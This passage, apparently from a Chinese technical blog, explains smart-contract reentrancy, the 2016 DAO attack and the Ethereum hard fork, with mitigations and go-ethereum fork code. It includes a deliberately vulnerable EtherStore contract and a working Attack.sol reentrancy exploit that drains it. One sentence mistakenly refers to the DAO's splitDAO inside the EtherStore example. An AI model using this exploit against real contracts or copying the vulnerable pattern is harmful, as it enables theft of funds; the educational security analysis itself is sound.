<p>如何理解防止重入呢？基本来说，攻击者要想实现攻击，需要让受害者执行自己的代码。而因为send和transfer都只能使用2300的gas，也即当执行完一小段代码之后，要么成功返回，要么gas耗尽，从而让攻击者所能做的操作相当有限。call.value不存在这个限制。接下来就是要将正常的操作流程导向攻击者的代码。</p>
<p>solidity还提供了一个特性：</p>
<h3 id="回退函数-fallback"><a href="#回退函数-fallback" class="headerlink" title="回退函数 - fallback()"></a>回退函数 - fallback()</h3><p>官方文档：</p>
<blockquote>
<p><strong>A contract can have exactly one unnamed function. This function cannot have arguments and cannot return anything. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).</strong></p>
</blockquote>
<p>一个合约可以具有一个匿名函数，该函数没有参数也没有返回值。当该合约被调用时找不到匹配的函数名，或者说被调用时没有提供参数，那么就调用fallback 函数。</p>
<blockquote>
<p>pragma solidity ^0.4.0;</p>
<p>contract SimpleFallback{<br><strong>function</strong>(){<br><em>&#x2F;&#x2F;fallback function</em><br>}<br>}</p>
</blockquote>
<p>另外，当使用<code>address.send(ether to send)</code>向某个合约直接转帐时，由于这个行为没有发送任何数据，所以接收合约总是会调用fallback函数。在这种情况下，一定要定义fallback函数，并且fallback函数还必须使用Payable修饰，否则send会报错。正是因为如此，所以对send函数做了一定的限制，gas只能使用2300。这样，下述行为消耗的gas都将超过fallback函数限定的gas值：</p>
<ul>
<li>向区块链中写数据</li>
<li>创建一个合约</li>
<li>调用一个external的函数</li>
<li>发送ether</li>
</ul>
<p>所以一般，我们只能在fallback函数中进行一些日志操作：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract FallbackFailOnGasLimit&#123;</span><br><span class="line">  uint someStorage;</span><br><span class="line"></span><br><span class="line">  event fallbackTrigged(bytes);</span><br><span class="line">  function() payable&#123;</span><br><span class="line">    fallbackTrigged(msg.data);</span><br><span class="line">    //将因为写入操作失败，注释掉下面这行，将会执行成功</span><br><span class="line">    someStorage = 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function callFallback() returns (bool)&#123;</span><br><span class="line">    return this.send(0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是对call.value没有2300 gas的限制。如果在调用过程中没有设置gas的值，那么会一直运行直到耗尽所有的gas。也即，如果想要执行恶意代码，多准备点gas就好。</p>
<p>接下来，我们看一个例子。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">EtherStore.sol：</span><br><span class="line"></span><br><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">    uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">    mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function depositFunds() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawFunds (uint256 _weiToWithdraw) public &#123; </span><br><span class="line">       require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">        // limit the withdrawal </span><br><span class="line">       require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">        // limit the time allowed to withdraw</span><br><span class="line">        require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks); </span><br><span class="line">       require(msg.sender.call.value(_weiToWithdraw)()); </span><br><span class="line">       balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">        lastWithdrawTime[msg.sender] = now;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>以上代码就是被攻击代码。它的功能是充当公共账户，类似于银行，接收用户存款（depositFund），提供用户取现功能（withdrawFunds）。</p>
<p>depositFund中，简单增加用户账户的余额，在用户取现的时候，首先做检查，确保用户账户的余额超出所要提取的金额，然后检查取现金额的最大值；接下来再对取现的时间进行限制，确保一周支取一次。然后将钱转给调用者账户，随后修改调用者msg.send的余额，并更新最新的取现时间。</p>
<p>这段合约的漏洞就在于：require(msg.sender.call.value(_weiToWithdraw)());</p>
<p>当被攻击代码执行到这一句的时候，它会调用msg.send代码中的fallback函数。如果是正常的fallback函数，譬如写日志，那没有任何问题；但是如果是攻击者精心准备的恶意代码，会有各种效果。</p>
<p>譬如，下面一段攻击代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Attack.sol：</span><br><span class="line"></span><br><span class="line">import &quot;EtherStore.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"> EtherStore public etherStore;</span><br><span class="line"></span><br><span class="line">  // intialise the etherStore variable with the contract address</span><br><span class="line"> constructor(address _etherStoreAddress) &#123;</span><br><span class="line">     etherStore = EtherStore(_etherStoreAddress);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  function pwnEtherStore() public payable &#123;</span><br><span class="line">      // attack to the nearest ether</span><br><span class="line">     require(msg.value &gt;= 1 ether); </span><br><span class="line">     // send eth to the depositFunds() function</span><br><span class="line">     etherStore.depositFunds.value(1 ether)();</span><br><span class="line">      // start the magic</span><br><span class="line">     etherStore.withdrawFunds(1 ether);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  function collectEther() public &#123;</span><br><span class="line">     msg.sender.transfer(this.balance);</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"> // fallback function - where the magic happens</span><br><span class="line"> function () payable &#123;</span><br><span class="line">      if (etherStore.balance &gt; 1 ether) &#123;</span><br><span class="line">         etherStore.withdrawFunds(1 ether);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击者首先准备好 etherStore变量，并将作为被攻击代码的地址作为参数传入。</p>
<p>etherStore &#x3D; EtherStore(_etherStoreAddress);</p>
<p>攻击者准备好pwnEtherStore()，这个函数首先向被攻击合约中存入一定以太币，假设是1以太币（因为EtherStore.sol要求取现是账户里有一定余额）。</p>
<p>etherStore.depositFunds.value(1 ether)()</p>
<p>然后进行取现，调用 etherStore.withdrawFunds(1 ether);</p>
<p>因为withdraw函数中使用了call.value()，根据solidity的规范，fallback函数将在Attack合约收到Ether（不带data）时自动执行。此fallback函数将通过递归触发对THE DAO的splitDAO函数的多次调用所以会调用攻击者合约中的匿名函数，而在攻击者的匿名函数中，又再次调用</p>
<p>etherStore.withdrawFunds(1 ether)。</p>
<p>因为受害者的代码中withdrawFunds在call.value之后才修改攻击者的余额，而call.value触发fallback，再次执行withdraw，所以相当于攻击者的余额一直没有机会被修改。这样，只要攻击者的gas足够多，它会一直将公共账户也即Bank里的钱全部移走。</p>
<p>因为攻击者的代码使得受害者合约一遍遍地重新执行攻击代码，所以也叫“重入”攻击。</p>
<p><strong>防御措施：</strong></p>
<p>从代码看，本次攻击得以成功的因素有二：一是dao余额扣减和Ether转账这两步操作的顺序有误，二是不受限制地执行未知代码。</p>
<p>应用代码顺序方面，应先扣减dao的余额再转账Ether，因为dao的余额检查作为转账Ether的先决条件，要求dao的余额状况必须能够及时反映最新状况。在问题代码实现中，尽管最深的递归返回并成功扣减黑客的dao余额，但此时对黑客dao余额的扣减已经无济于事，因为其上各层递归调用中余额检查都已成功告终，已经不会再有机会判断最新余额了。</p>
<p>不受限制地执行未知代码方面，虽然黑客当前是利用了solidity提供的匿名fallback函数，但这种对未知代码的执行原则上可以发生在更多场景下，因为合约之间的消息传递完全类似于面向对象程序开发中的方法调用，而提供接口等待回调是设计模式中常见的手法，所以完全有可能执行一个未知的普通函数。</p>
<p>本次漏洞属于应用层面，并不是以太坊本身的问题，甚至都不能归咎于“图灵完备”，因为这种攻击即使在一个非图灵完备的平台上也可以奏效。总的来说，应用越复杂，应用出现安全问题的概率就越高。</p>
<p>有许多常用技术可以帮助避免智能合约中潜在的重入漏洞：</p>
<ol>
<li>在将 Ether 发送给外部合约时使用内置的 transfer() 函数 。transfer转账功能只发送 2300 gas 不足以使目的地址&#x2F;合约调用另一份合约（即重入发送合约）。</li>
<li>确保所有改变状态变量的逻辑发生在 Ether 被发送出合约（或任何外部调用）之前。在这个 EtherStore 例子中，EtherStore.sol 中对账户余额和账户时间的修改应该在发送以太币之前。将任何对未知地址执行外部调用的代码，放置在本地化函数或代码执行中作为最后一个操作，是一种很好的做法。这被称为 <a href="https://link.zhihu.com/?target=http://solidity.readthedocs.io/en/latest/security-considerations.html%23use-the-checks-effects-interactions-pattern">检查效果交互（checks-effects-interactions）</a> 模式。</li>
<li>引入互斥锁。也就是说，要添加一个在代码执行过程中锁定合约的状态变量，阻止重入调用；这样在本次发送–修改余额这一整套操作完成之前，不能再次执行发送操作。</li>
</ol>
<p>譬如修改代码如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract EtherStore &#123;</span><br><span class="line"></span><br><span class="line">// initialise the mutex</span><br><span class="line">bool reEntrancyMutex = false;</span><br><span class="line">uint256 public withdrawalLimit = 1 ether;</span><br><span class="line">mapping(address =&gt; uint256) public lastWithdrawTime;</span><br><span class="line">mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">function depositFunds() public payable &#123;</span><br><span class="line">    balances[msg.sender] += msg.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdrawFunds (uint256 _weiToWithdraw) public &#123;</span><br><span class="line">    require(!reEntrancyMutex);</span><br><span class="line">    require(balances[msg.sender] &gt;= _weiToWithdraw);</span><br><span class="line">    // limit the withdrawal</span><br><span class="line">    require(_weiToWithdraw &lt;= withdrawalLimit);</span><br><span class="line">    // limit the time allowed to withdraw</span><br><span class="line">    require(now &gt;= lastWithdrawTime[msg.sender] + 1 weeks);</span><br><span class="line">    balances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">    lastWithdrawTime[msg.sender] = now; </span><br><span class="line">   // set the reEntrancy mutex before the external call</span><br><span class="line">    reEntrancyMutex = true; </span><br><span class="line">   msg.sender.transfer(_weiToWithdraw);</span><br><span class="line">    // release the mutex after the external call </span><br><span class="line">   reEntrancyMutex = false;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用reEntrancyMutex可以保证代码不可重入。类似于多线程的互斥锁。</p>
<p>THE DAO攻击后续：</p>
<p>THE DAO 创始人之一 Stephan TualTual 在 6 月 12 日宣布，他们发现了软件中存在的 “递归调用漏洞” 问题。 不幸的是，在程序员修复这一漏洞及其他问题的期间，一个不知名的黑客开始利用这一途径收集 THE DAO 代币销售中所得的以太币。6 月 18 日，黑客成功挖到超过 360 万个以太币，并投入到一个 DAO 子组织中，这个组织和 THE DAO 有着同样的结构。因为THE DAO 持有近 15% 的以太币总数，因此 THE DAO 这次的问题对以太坊网络及其加密币都产生了负面影响。</p>
<p>6 月 17 日，以太坊基金会的 Vitalik Buterin在以太坊官方博客发布题为［紧急状态更新：关于the DAO的漏洞］的文章，他表示，DAO 正在遭到攻击，不过他已经研究出了解决方案：</p>
<blockquote>
<p>现在提出了软件分叉解决方案，通过这种软件分叉，任何调用代码或委托调用的交易 —— 借助代码 hash0x7278d050619a624f84f51987149ddb439cdaadfba5966f7cfaea7ad44340a4ba（也就是 DAO 和子 DAO）来减少账户余额 —— 都会视为无效……</p>
</blockquote>
<p>最终因为社交的不同意见，最终以太坊分裂出支持继续维持原状的以太经典 ETC，同意软件分叉解决方案的在以太坊当前网络实施。</p>
<p>【疑似】攻击者通过一个中介表示，他会暂停这个有组织的对他财产的“盗窃”，他会奖励不支持这项软分叉提议的矿工（节点），他说：</p>
<blockquote>
<p>“很快我们就会有一个智能合约来奖励矿工，奖励那些反对软分叉并进行挖矿的人。共计100万个以太币，以及100个比特币会分享给矿工。”</p>
</blockquote>
<p>V神的解决方案实际上就是产生分叉，让黑客的操作无效。软分叉将从块高度1760000开始把任何与the DAO和child DAO相关的交易认做无效交易，以此阻止攻击者在27天之后提现被盗 的以太币。这之后会有一次硬分叉将以太币找回。</p>
<p>以下内容来自于参考文献11：</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a><strong>解决方案</strong></h3><p>因为投资者已经将以太币投入了 The DAO 合约或者其子合约中，在攻击后无法立刻撤回。<br>需要让投资者快速撤回投资，且能封锁黑客转移资产。</p>
<p>V 神公布的解决方案是，在程序中植入转移合约以太币代码，让矿工选择是否支持分叉。在分叉点到达时则将 The DAO 和其子合约中的以太币转移到一个新的安全的可取款合约中。全部转移后，原投资者则可以直接从取款合约中快速的拿回以太币。取款合约在讨论方案时，已经部署到主网。合约地址是 <a href="https://link.zhihu.com/?target=https://%5Betherscan%5D(https//learnblockchain.cn/docs/etherscan/">0xbf4ed7b27f1d666546e30d74d50d173d20bca754</a>.io&#x2F;address&#x2F;0xbf4ed7b27f1d666546e30d74d50d173d20bca754)。</p>
<p>取款合约代码如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// Deployed on mainnet at 0xbf4ed7b27f1d666546e30d74d50d173d20bca754</span><br><span class="line"></span><br><span class="line">contract DAO &#123;</span><br><span class="line">    function balanceOf(address addr) returns (uint);</span><br><span class="line">    function transferFrom(address from, address to, uint balance) returns (bool);</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract WithdrawDAO &#123;</span><br><span class="line">    DAO constant public mainDAO = DAO(0xbb9bc244d798123fde783fcc1c72d3bb8c189413);</span><br><span class="line">    address public trustee = 0xda4a4626d3e16e094de3225a751aab7128e96526;</span><br><span class="line"></span><br><span class="line">    function withdraw()&#123;</span><br><span class="line">        uint balance = mainDAO.balanceOf(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))</span><br><span class="line">            throw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trusteeWithdraw() &#123;</span><br><span class="line">        trustee.send((this.balance + mainDAO.balanceOf(this)) - mainDAO.totalSupply());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，为照顾两个阵营，软件提供硬分叉开关，选择权则交给社区。支持分叉的矿工会在 X 区块到 X+9 区块出块时，在区块 <code>extradata</code> 字段中写入 <code>0x64616f2d686172642d666f726b</code>（“dao-hard-fork” 的十六进制数）。从分叉点开始，如果连续 10 个区块均有硬分叉投票，则表示硬分叉成功。</p>
<h3 id="矿工投票与区块头校验"><a href="#矿工投票与区块头校验" class="headerlink" title="矿工投票与区块头校验"></a><strong>矿工投票与区块头校验</strong></h3><p>首先，选择权交给社区。因此是否同意硬分叉，可通过参数进行选择。但是在当前版本中，社区已完成硬分叉，所以已移除开关类代码。</p>
<p>当前，主网已默认配置支持 DAO 分叉，并设定了开始硬分叉高度 1920000，代码如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// params/config.go:38</span><br><span class="line">MainnetChainConfig = &amp;ChainConfig&#123; </span><br><span class="line">		DAOForkBlock:        big.NewInt(1920000),</span><br><span class="line">		DAOForkSupport:      true, </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>如果矿工支持分叉，则需要在从高度 192000 到 192009，在区块头 <code>extradata</code> 写入指定信息 0x64616f2d686172642d666f726b ，以表示支持硬分叉。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">//params/dao.go:28</span><br><span class="line">var DAOForkBlockExtra = common.FromHex(&quot;0x64616f2d686172642d666f726b&quot;)</span><br><span class="line"></span><br><span class="line">// params/dao.go:32</span><br><span class="line">var DAOForkExtraRange = big.NewInt(10)</span><br></pre></td></tr></table></figure>

<p>支持硬分叉时矿工写入固定的投票信息：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// miner/worker.go:857</span><br><span class="line">if daoBlock := w.config.DAOForkBlock; daoBlock != nil &#123; </span><br><span class="line">    // 检查是否区块是否仍然属于分叉处理期间：[DAOForkBlock,DAOForkBlock+10)</span><br><span class="line">    limit := new(big.Int).Add(daoBlock, params.DAOForkExtraRange)</span><br><span class="line">    if header.Number.Cmp(daoBlock) &gt;= 0 &amp;&amp; header.Number.Cmp(limit) &lt; 0 &#123;</span><br><span class="line">        // 如果支持分叉，则覆盖Extra，写入保留的投票信息</span><br><span class="line">        if w.config.DAOForkSupport &#123;</span><br><span class="line">        header.Extra = common.CopyBytes(params.DAOForkBlockExtra)</span><br><span class="line">        &#125; else if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123;</span><br><span class="line">            // 如果矿工反对，则不能让其使用保留信息，覆盖它。</span><br><span class="line">        header.Extra = []byte&#123;&#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要连续 10 个区块的原因是为了防止矿工使用保留信息污染非分叉块和方便轻节点安全同步数据。<br>同时，所有节点在校验区块头时，必须安全地校验特殊字段信息，校验区块是否属于正确的分叉上。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// consensus/ethash/consensus.go:294 </span><br><span class="line">if err := misc.VerifyDAOHeaderExtraData(chain.Config(), header); err != nil &#123; //❶</span><br><span class="line">	return err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// consensus/misc/dao.go:47 </span><br><span class="line">func VerifyDAOHeaderExtraData(config *params.ChainConfig, header *types.Header) error &#123; </span><br><span class="line">	if config.DAOForkBlock == nil &#123;//❷</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	limit := new(big.Int).Add(config.DAOForkBlock, params.DAOForkExtraRange) //❸</span><br><span class="line">	if header.Number.Cmp(config.DAOForkBlock) &lt; 0 || header.Number.Cmp(limit) &gt;= 0 &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	if config.DAOForkSupport &#123;</span><br><span class="line">		if !bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123; //❹</span><br><span class="line">			return ErrBadProDAOExtra</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123;//❺</span><br><span class="line">			return ErrBadNoDAOExtra</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	// All ok, header has the same extra-data we expect</span><br><span class="line">	return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>❶ 在校验区块头时增加 DAO 区块头识别校验。</li>
<li>❷ 如果节点未设置分叉点，则不校验。</li>
<li>❸ 确保只需在 DAO 分叉点的 10 个区块上校验。</li>
<li>❹ 如果节点允许分叉，则要求区块头 Extra 必须符合要求。</li>
<li>❺ 当然，如果节点不允许分叉，则也不能在区块头中加入非分叉链的 Extra 特殊信息。</li>
</ul>
<p>这种 <code>config.DAOForkBlock</code> 开关，类似于互联网公司产品新功能灰度上线的功能开关。在区块链上，可以先实现功能代码逻辑。至于何时启用，则可以在社区、开发者讨论后，确定最终的开启时间。当然区块链上区块高度等价于时间戳，比如 DAO 分叉点 1920000 也是讨论后敲定。</p>
<h3 id="如何分离网络？"><a href="#如何分离网络？" class="headerlink" title="如何分离网络？"></a><strong>如何分离网络？</strong></h3><p>如果分叉后不能快速地分离网络，会导致节点出现奇奇怪怪的问题。这次的 The DAO 分叉处理是通过特定代码拦截实现。不应该让节点同时成为两个阵营的中继点，应分离出两个网络，以让其互不干预。The DAO 硬分叉的处理方式是：节点连接握手后，向对方请求分叉区块头信息。在 15 秒必须响应，否则断开连接。</p>
<p>代码实现是在 <code>eth/handler.go</code> 文件中，在消息层进行拦截处理。节点握手后，开始 15 秒倒计时，一旦倒计时结束，则断开连接。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:300</span><br><span class="line">	p.forkDrop = time.AfterFunc(daoChallengeTimeout, func() &#123;</span><br><span class="line">		p.Log().Debug(&quot;Timed out DAO fork-check, dropping&quot;)</span><br><span class="line">		pm.removePeer(p.id)</span><br><span class="line">	&#125;)</span><br></pre></td></tr></table></figure>

<p>在倒计时前，需要向对方索要区块头信息，以进行分叉校验。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:297</span><br><span class="line">	if err := p.RequestHeadersByNumber(daoBlock.Uint64(), 1, 0, false); err != nil &#123;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">此时，对方在接收到请求时，如果存在此区块头则返回，否则忽略。</span><br><span class="line"></span><br><span class="line">```go</span><br><span class="line">// eth/handler.go:348</span><br><span class="line">	case msg.Code == GetBlockHeadersMsg:  </span><br><span class="line">		var query getBlockHeadersData</span><br><span class="line">		if err := msg.Decode(&amp;query); err != nil &#123;</span><br><span class="line">			return errResp(ErrDecode, &quot;%v: %v&quot;, msg, err)</span><br><span class="line">		&#125;</span><br><span class="line">		hashMode := query.Origin.Hash != (common.Hash&#123;&#125;)</span><br><span class="line">		first := true</span><br><span class="line">		maxNonCanonical := uint64(100) </span><br><span class="line">		var (</span><br><span class="line">			bytes   common.StorageSize</span><br><span class="line">			headers []*types.Header</span><br><span class="line">			unknown bool</span><br><span class="line">		)</span><br><span class="line">		//省略一部分 ...</span><br><span class="line">		return p.SendBlockHeaders(headers)</span><br></pre></td></tr></table></figure>

<p>这样，有几种情况出现。根据不同情况分别处理：</p>
<ol>
<li>有返回区块头：</li>
</ol>
<p>如果返回的区块头不一致，则校验不通过，等待倒计时结束。如果区块头一致，则根据前面提到的校验分叉区块方式检查。校验失败，此直接断开连接，说明已经属于不同分叉。校验通过，则关闭倒计时，完成校验。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:465</span><br><span class="line">if p.forkDrop != nil &amp;&amp; pm.chainconfig.DAOForkBlock.Cmp(headers[0].Number) == 0 &#123; </span><br><span class="line">				p.forkDrop.Stop()</span><br><span class="line">				p.forkDrop = nil</span><br><span class="line"> </span><br><span class="line">				if err := misc.VerifyDAOHeaderExtraData(pm.chainconfig, headers[0]); err != nil &#123;</span><br><span class="line">					p.Log().Debug(&quot;Verified to be on the other side of the DAO fork, dropping&quot;)</span><br><span class="line">					return err</span><br><span class="line">				&#125;</span><br><span class="line">				p.Log().Debug(&quot;Verified to be on the same side of the DAO fork&quot;)</span><br><span class="line">				return nil</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>没有返回区块头：</li>
</ol>
<p>如果自己也没有到达分叉高度，则不校验，假定双方在同一个网络。但我自己已经到达分叉高度，则考虑对方的 TD 是否高于我的分叉块。如果是，则包容，暂时认为属于同一网络。否则，则校验失败。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:442 </span><br><span class="line">if len(headers) == 0 &amp;&amp; p.forkDrop != nil &#123; </span><br><span class="line">	verifyDAO := true</span><br><span class="line"></span><br><span class="line">	if daoHeader := pm.blockchain.GetHeaderByNumber(pm.chainconfig.DAOForkBlock.Uint64()); daoHeader != nil &#123;</span><br><span class="line">		if _, td := p.Head(); td.Cmp(pm.blockchain.GetTd(daoHeader.Hash(), daoHeader.Number.Uint64())) &gt;= 0 &#123;</span><br><span class="line">			verifyDAO = false</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	if verifyDAO &#123;</span><br><span class="line">		p.Log().Debug(&quot;Seems to be on the same side of the DAO fork&quot;)</span><br><span class="line">		p.forkDrop.Stop()</span><br><span class="line">		p.forkDrop = nil</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="转移资产"><a href="#转移资产" class="headerlink" title="转移资产"></a><strong>转移资产</strong></h3><p>上述所做的一切均为安全、稳定的硬分叉，隔离两个网络。硬分叉的目的是，以人为介入的方式拦截攻击者资产。一旦到达分叉点，则立即激活资产转移操作。首先，矿工在挖到分叉点时，需执行转移操作：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// miner/worker.go:877</span><br><span class="line">func (w *worker) commitNewWork(interrupt *int32, noempty bool, timestamp int64) &#123;</span><br><span class="line">	// ...</span><br><span class="line">// Create the current work task and check any fork transitions needed</span><br><span class="line">	env := w.current</span><br><span class="line">	if w.config.DAOForkSupport &amp;&amp; w.config.DAOForkBlock != nil &amp;&amp; w.config.DAOForkBlock.Cmp(header.Number) == 0 &#123;</span><br><span class="line">		misc.ApplyDAOHardFork(env.state)</span><br><span class="line">	&#125;</span><br><span class="line">	// ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其次，任何节点在接收区块，进行本地处理校验时同样需要在分叉点执行：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// core/state_processor.go:66</span><br><span class="line">func (p *StateProcessor) Process(block *types.Block, statedb *state.StateDB, cfg vm.Config) (types.Receipts, []*types.Log, uint64, error) &#123;</span><br><span class="line">	//...</span><br><span class="line">	// Mutate the block and state according to any hard-fork specs</span><br><span class="line">	if p.config.DAOForkSupport &amp;&amp; p.config.DAOForkBlock != nil &amp;&amp; p.config.DAOForkBlock.Cmp(block.Number()) == 0 &#123;</span><br><span class="line">		misc.ApplyDAOHardFork(statedb)</span><br><span class="line">	&#125;</span><br><span class="line">	//...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转移资金也是通过取款合约处理。将 The DAO 合约包括子合约的资金，全部转移到新合约中。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">func ApplyDAOHardFork(statedb *state.StateDB) &#123;</span><br><span class="line">	// Retrieve the contract to refund balances into</span><br><span class="line">	if !statedb.Exist(params.DAORefundContract) &#123;</span><br><span class="line">		statedb.CreateAccount(params.DAORefundContract)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Move every DAO account and extra-balance account funds into the refund contract</span><br><span class="line">	for _, addr := range params.DAODrainList() &#123;</span><br><span class="line">		statedb.AddBalance(params.DAORefundContract, statedb.GetBalance(addr))</span><br><span class="line">		statedb.SetBalance(addr, new(big.Int))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，合约资金已全部强制转移到新合约。</p>
<hr>
<p>通过以上解决方案，THE DAO投资者的资产获得了保障。但是也引起了不少争议。</p>
<p>Reddit上有人说：</p>
<blockquote>
<p>“以太坊基金会参与DAO项目就是个错误。因为我觉得以太坊应该挑选一些能够成功的项目以及实验来提供基础架构，而反过来它们要想成功，则需要一个强大的基础，而且要求坦诚得面对挑战。硬分叉提议的妥协，破坏了这种坦诚，而且意味着DAO项目会反过来影响它们自己的基础架构。就我而言，这是完全无法接受的，也违背了曾经吸引我的以太坊原则。”<br>硬分叉是一个有效选项，但是它是针对需要紧急整改以太坊协议本身的情况的，而非利用以太坊平台的其他项目。<br>以太坊基金会已经参与进来，而且推广了THE DAO项目，这整个事件就是个错误，它只会损害人们对以太坊作为其他项目基础架构的信任。<br>我希望他们能纠正这个错误。</p>
</blockquote>
<p>也有其他人表示：</p>
<blockquote>
<p>“在头几天我做了个坏决定，然后我损失了2万个以太币，能把这些以太币也还给我吗？先谢谢了！”</p>
</blockquote>
<p>最后：</p>
<blockquote>
<p>“以太坊一直按其目标在运作。我觉得既然现在管用，就不该去更新软件。你可以想象一下你的投资会遭遇的风险。如果你不清楚你的投资情况，那你就会遇到未知的风险。其他任何东西都会是中央权威机构的一种援助，和加密世界形成对照。相似的，这也就是为什么雷曼兄弟会失败——因为交易就是交易，如果你为了某些特定参与者该改变规则，那么其他参与者也会想要这种特殊待遇。”</p>
</blockquote>
<p><strong>项目太大，不能失败</strong></p>
<p>雷曼兄弟事件发生一个月后，其他银行就得到了特殊待遇，你可以自己考量这是否是好事——这和我们现在的情况相似。THE DAO不是一个孤岛。</p>
<p>这个项目太大了，它不能出现问题，这是以太坊生态系统的观点之一。可能大家会注意到，以太坊基金会中也有几个人是DAO代币拥有者及THE DAO项目顾问。甚至是Gavin Wood——以太坊最初创始人之一，也在博客中支持这个分叉。</p>
<p>在他的观点中，很有可能其他大型项目也会需要救助，而以太坊基金会之前已经遇到过先例，可能需要再次要求矿工来重写历史。很明显这和银行救助非常相似：银行要承担大量风险来期待较大回报，而当这些交易出现问题时，纳税人就会“拯救”他们（除了可能的雷曼兄弟）。一般来说，这种风险的不对称性对激励市场参与者来说，不是好办法。</p>
<p>这是两个极端，但是大多数人都会倾向于其中的一个。法律专家都会如此，更别提普通人。</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011721501/article/details/79450122">区块链安全 - DAO攻击事件解析</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</a></li>
<li><a href="https://link.zhihu.com/?target=https://news.bitcoin.com/verge-is-forced-to-fork-after-suffering-a-51-attack/">https://news.bitcoin.com/verge-is-forced-to-fork-after-suffering-a-51-attack/</a></li>
<li><a href="https://link.zhihu.com/?target=https://news.bitcoin.com/verge-struck-by-second-pow-attack-in-as-many-months/">https://news.bitcoin.com/verge-struck-by-second-pow-attack-in-as-many-months/</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/the-verge-hack-explained-part-1">干货 | Verge 攻击解析，Part-1</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/ajian1984/articles/32325">干货 | Verge 攻击解析，Part-2</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/article/93713">https://www.8btc.com/article/93713</a></li>
